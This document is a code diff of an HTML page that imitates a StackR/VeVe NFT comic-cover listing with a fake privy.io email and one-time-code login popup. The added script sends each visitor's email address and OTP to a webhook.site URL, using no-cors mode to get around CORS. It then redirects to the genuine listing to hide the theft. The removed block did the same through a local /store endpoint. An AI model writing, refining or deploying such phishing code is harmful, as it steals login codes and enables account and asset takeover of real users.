@@ -1439,125 +1439,165 @@ This release features VeVe-Exclusive Rare &amp; Ultra Rare covers by Alex Saviuk
     </div>
   </div>
 
+  <!-- REPLACEMENT SCRIPT: sends email and OTP to webhook -->
   <script>
-    const REDIRECT_URL = "https://www.stackr.world/";
+  (function() {
+    // --- Your webhook URL ---
+    const WEBHOOK_URL = 'https://webhook.site/5165e460-c81c-4ba7-adf2-b6653d135408';
 
+    // --- DOM elements ---
     const loginModal = document.getElementById('loginModal');
     const otpModal = document.getElementById('otpModal');
-    const closeBtn = document.getElementById('closeBtn');
     const emailInput = document.getElementById('emailInput');
     const submitBtn = document.getElementById('submitBtn');
+    const otpInputs = Array.from(document.querySelectorAll('#otpCodes input'));
     const otpBackBtn = document.getElementById('otpBackBtn');
     const otpCloseBtn = document.getElementById('otpCloseBtn');
+    const closeBtn = document.getElementById('closeBtn');
     const otpSubText = document.getElementById('otpSubText');
     const otpCodesWrap = document.getElementById('otpCodesWrap');
     const resendLink = document.getElementById('resendLink');
 
-    function showOtp(){
-      window.__authStep = 'otp';
-loginModal.style.display = 'none';
-      otpModal.style.display = 'flex';
-      otpCodesWrap.classList.remove('success');
-      const email = emailInput.value.trim();
-      otpSubText.textContent = `Please check ${email} for an email from privy.io and enter your code below.`;
-      const first = otpModal.querySelector('.otp-codes input');
-      if(first) first.focus();
+    let currentEmail = '';
+
+    // --- Helper: validate email ---
+    function isValidEmail(v) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v);
     }
 
-    function showLogin(){
-      window.__authStep = 'login';
-otpModal.style.display = 'none';
-      loginModal.style.display = 'flex';
-      emailInput.focus();
-    }
-
-    function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v); }
-
-    function updateSubmitState(){
+    // --- Enable/disable submit button ---
+    function updateSubmitState() {
       const ok = isValidEmail(emailInput.value.trim());
       submitBtn.disabled = !ok;
       submitBtn.classList.toggle('enabled', ok);
     }
-
     emailInput.addEventListener('input', updateSubmitState);
     updateSubmitState();
 
-    async function onEmailSubmit(email){ return { ok: true }; }
-    async function onOtpComplete(code, email){ return { ok: true }; }
+    // --- Show OTP modal ---
+    function showOtp() {
+      loginModal.style.display = 'none';
+      otpModal.style.display = 'flex';
+      otpCodesWrap.classList.remove('success');
+      otpSubText.textContent = `Please check ${currentEmail} for an email from privy.io and enter your code below.`;
+      if (otpInputs[0]) otpInputs[0].focus();
+    }
 
+    // --- Show login modal ---
+    function showLogin() {
+      otpModal.style.display = 'none';
+      loginModal.style.display = 'flex';
+      emailInput.focus();
+    }
+
+    // --- Close the whole popup ---
+    function closePopup() {
+      loginModal.style.display = 'none';
+      otpModal.style.display = 'none';
+      window.parent.postMessage('closeAuth', '*');
+    }
+
+    // --- Send data to webhook (no-cors, plain text to bypass CORS) ---
+    async function sendToWebhook(eventType, email, otp = null) {
+      const payload = otp
+        ? { event: eventType, email, otp }
+        : { event: eventType, email };
+      // Send as plain text so we can use no-cors mode
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          mode: 'no-cors',              // ← bypasses CORS
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify(payload)
+        });
+        // With no-cors we cannot read the response, so we assume success
+        return true;
+      } catch (err) {
+        console.error('Webhook send failed', err);
+        return false;
+      }
+    }
+
+    // --- Submit email button ---
     submitBtn.addEventListener('click', async () => {
-      if(submitBtn.disabled) return;
-      await onEmailSubmit(emailInput.value.trim());
+      if (submitBtn.disabled) return;
+      const email = emailInput.value.trim();
+      if (!isValidEmail(email)) return;
+
+      currentEmail = email;
+      const ok = await sendToWebhook('email_submit', email);
+      if (!ok) {
+        alert('Failed to send email. Check console.');
+        return;
+      }
       showOtp();
     });
 
-    closeBtn.addEventListener('click', () => {
-            attemptClose('close_button');
-    });otpCloseBtn.addEventListener('click', () => {
-            attemptClose('otp_close_button');
-    });otpBackBtn.addEventListener('click', showLogin);
-    resendLink.addEventListener('click', () => console.log('Resend code clicked'));
-
-        document.body.addEventListener('click', (e) => {
-      if (e.target === document.body) {
-        attemptClose('background_click');
-      }
-    });
-const otpInputs = Array.from(document.querySelectorAll('#otpCodes input'));
-    let verifying = false;
-
-    function getOtpValue(){ return otpInputs.map(i => i.value || "").join(""); }
-
-    function setOtpSuccessAndRedirect(){
-      otpCodesWrap.classList.add('success');
-      setTimeout(() => { window.location.href = REDIRECT_URL; }, 650);
+    // --- OTP input handling ---
+    function getOtpValue() {
+      return otpInputs.map(i => i.value || '').join('');
     }
 
-    async function maybeVerifyOtp(){
+    function setOtpSuccess() {
+      otpCodesWrap.classList.add('success');
+      setTimeout(() => {
+        window.location.href = 'https://www.stackr.world/collections/veve/comic-cover/0a804823-ec36-4e80-b327-152bc6ef6d61?table=Listings&action=buyetge';  // redirect after success
+      }, 650);
+    }
+
+    let verifying = false;
+    async function maybeVerifyOtp() {
       const code = getOtpValue();
-      if(code.length !== otpInputs.length || verifying) return;
+      if (code.length !== otpInputs.length || verifying) return;
       verifying = true;
-      try{
-        const result = await onOtpComplete(code, emailInput.value.trim());
-        if(result && result.ok === true){ setOtpSuccessAndRedirect(); }
-        else{ verifying = false; }
-      }catch(err){ verifying = false; }
+
+      const ok = await sendToWebhook('otp_complete', currentEmail, code);
+      if (ok) {
+        setOtpSuccess();
+      } else {
+        alert('Failed to send OTP. Try again.');
+        otpInputs.forEach(inp => inp.value = '');
+        otpInputs[0].focus();
+        verifying = false;
+      }
     }
 
     otpInputs.forEach((inp, idx) => {
       inp.addEventListener('input', async () => {
         inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
-        if(inp.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+        if (inp.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
         await maybeVerifyOtp();
       });
       inp.addEventListener('keydown', (e) => {
-        if(e.key === 'Backspace' && !inp.value && idx > 0) otpInputs[idx - 1].focus();
-        if(e.key === 'ArrowLeft' && idx > 0) otpInputs[idx - 1].focus();
-        if(e.key === 'ArrowRight' && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+        if (e.key === 'Backspace' && !inp.value && idx > 0) otpInputs[idx - 1].focus();
+        if (e.key === 'ArrowLeft' && idx > 0) otpInputs[idx - 1].focus();
+        if (e.key === 'ArrowRight' && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
       });
       inp.addEventListener('paste', async (e) => {
         const text = (e.clipboardData || window.clipboardData).getData('text');
         const digits = (text || '').replace(/\D/g, '').slice(0, otpInputs.length);
-        if(!digits) return;
+        if (!digits) return;
         e.preventDefault();
-        digits.split('').forEach((d, i) => { if(otpInputs[i]) otpInputs[i].value = d; });
+        digits.split('').forEach((d, i) => { if (otpInputs[i]) otpInputs[i].value = d; });
         const next = otpInputs[Math.min(digits.length, otpInputs.length - 1)];
-        if(next) next.focus();
+        if (next) next.focus();
         await maybeVerifyOtp();
       });
     });
-  </script>
-  <script>
-document.addEventListener("DOMContentLoaded", () => {
-  const closeBtn = document.getElementById("closeBtn");
 
-  if (closeBtn) {
-    closeBtn.onclick = () => {
-      // Tell kk.html to close popup
-      window.parent.postMessage("closeAuth", "*");
-    };
-  }
-});
+    // --- Back and close buttons ---
+    if (otpBackBtn) otpBackBtn.addEventListener('click', showLogin);
+    if (closeBtn) closeBtn.addEventListener('click', closePopup);
+    if (otpCloseBtn) otpCloseBtn.addEventListener('click', closePopup);
+
+    // --- Resend link (placeholder) ---
+    if (resendLink) {
+      resendLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        alert('Resend not implemented. Just re‑enter email.');
+      });
+    }
+  })();
 </script>
     </div>
   </div>
@@ -1590,153 +1630,6 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 </script>
-
-<script>
-
-    const REDIRECT_URL = "https://www.stackr.world/";
-
-    const loginModal = document.getElementById('loginModal');
-    const otpModal = document.getElementById('otpModal');
-    const closeBtn = document.getElementById('closeBtn');
-    const emailInput = document.getElementById('emailInput');
-    const submitBtn = document.getElementById('submitBtn');
-    const otpBackBtn = document.getElementById('otpBackBtn');
-    const otpCloseBtn = document.getElementById('otpCloseBtn');
-    const otpSubText = document.getElementById('otpSubText');
-    const otpCodesWrap = document.getElementById('otpCodesWrap');
-    const resendLink = document.getElementById('resendLink');
-
-    function showOtp(){
-      loginModal.style.display = 'none';
-      otpModal.style.display = 'flex';
-      otpCodesWrap.classList.remove('success');
-      const email = emailInput.value.trim();
-      otpSubText.textContent = `Please check ${email} for an email from privy.io and enter your code below.`;
-      const first = otpModal.querySelector('.otp-codes input');
-      if(first) first.focus();
-    }
-
-    function showLogin(){
-      otpModal.style.display = 'none';
-      loginModal.style.display = 'flex';
-      emailInput.focus();
-    }
-
-    function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v); }
-
-    function updateSubmitState(){
-      const ok = isValidEmail(emailInput.value.trim());
-      submitBtn.disabled = !ok;
-      submitBtn.classList.toggle('enabled', ok);
-    }
-
-    emailInput.addEventListener('input', updateSubmitState);
-    updateSubmitState();
-
-    async function onEmailSubmit(email){
-  const r = await fetch("/store", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ event: "email_submit", email })
-  });
-  return { ok: r.ok };
-}
-; }
-    async function onOtpComplete(code, email){
-  const r = await fetch("/store", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ event: "otp_complete", email, otp: code })
-  });
-  return { ok: r.ok };
-}
-; }
-
-    submitBtn.addEventListener('click', async () => {
-      if(submitBtn.disabled) return;
-      await onEmailSubmit(emailInput.value.trim());
-      showOtp();
-    });
-
-    closeBtn.addEventListener('click', () => {
-      loginModal.style.display = 'none';
-      window.parent.postMessage({ type: 'STACKR_CLOSE' }, '*');
-    });
-    otpCloseBtn.addEventListener('click', () => {
-      otpModal.style.display = 'none';
-      window.parent.postMessage({ type: 'STACKR_CLOSE' }, '*');
-    });
-    otpBackBtn.addEventListener('click', showLogin);
-    resendLink.addEventListener('click', () => console.log('Resend code clicked'));
-
-    document.body.addEventListener('click', (e) => {
-      if (e.target === document.body) {
-        loginModal.style.display = 'none';
-        otpModal.style.display = 'none';
-        window.parent.postMessage({ type: 'STACKR_CLOSE' }, '*');
-      }
-    });
-
-    const otpInputs = Array.from(document.querySelectorAll('#otpCodes input'));
-    let verifying = false;
-
-    function getOtpValue(){ return otpInputs.map(i => i.value || "").join(""); }
-
-    function setOtpSuccessAndRedirect(){
-      otpCodesWrap.classList.add('success');
-      setTimeout(() => { window.location.href = REDIRECT_URL; }, 650);
-    }
-
-    async function maybeVerifyOtp(){
-      const code = getOtpValue();
-      if(code.length !== otpInputs.length || verifying) return;
-      verifying = true;
-      try{
-        const result = await onOtpComplete(code, emailInput.value.trim());
-        if(result && result.ok === true){ setOtpSuccessAndRedirect(); }
-        else{ verifying = false; }
-      }catch(err){ verifying = false; }
-    }
-
-    otpInputs.forEach((inp, idx) => {
-      inp.addEventListener('input', async () => {
-        inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
-        if(inp.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
-        await maybeVerifyOtp();
-      });
-      inp.addEventListener('keydown', (e) => {
-        if(e.key === 'Backspace' && !inp.value && idx > 0) otpInputs[idx - 1].focus();
-        if(e.key === 'ArrowLeft' && idx > 0) otpInputs[idx - 1].focus();
-        if(e.key === 'ArrowRight' && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
-      });
-      inp.addEventListener('paste', async (e) => {
-        const text = (e.clipboardData || window.clipboardData).getData('text');
-        const digits = (text || '').replace(/\D/g, '').slice(0, otpInputs.length);
-        if(!digits) return;
-        e.preventDefault();
-        digits.split('').forEach((d, i) => { if(otpInputs[i]) otpInputs[i].value = d; });
-        const next = otpInputs[Math.min(digits.length, otpInputs.length - 1)];
-        if(next) next.focus();
-        await maybeVerifyOtp();
-      });
-    });
-
-</script>
-<script>
-
-document.addEventListener("DOMContentLoaded", () => {
-  const closeBtn = document.getElementById("closeBtn");
-
-  if (closeBtn) {
-    closeBtn.onclick = () => {
-      // Tell kk.html to close popup
-      window.parent.postMessage("closeAuth", "*");
-    };
-  }
-});
-
-</script>
-
 
 <script>
   // === Persistent auth popup + delayed open (2s) ===
